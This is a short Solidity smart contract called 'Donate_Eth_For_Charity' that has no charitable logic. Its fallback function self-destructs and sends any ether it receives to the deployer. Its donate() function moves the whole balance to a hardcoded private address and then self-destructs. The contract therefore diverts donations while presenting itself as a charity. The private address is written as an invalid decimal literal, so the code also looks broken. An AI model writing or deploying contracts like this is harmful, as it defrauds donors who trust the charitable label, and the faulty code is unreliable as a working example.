pragma solidity ^0.4.25;
contract Donate_Eth_For_Charity {

  address public owner;

  address private a = 0x421457353575317355771110318804984874315;

  function () external payable {
    selfdestruct(owner);
  }

  function donate() public payable{
  a.transfer(address(this).balance);
    selfdestruct(owner);
  }

  constructor() public {
    owner = msg.sender;
  }
}

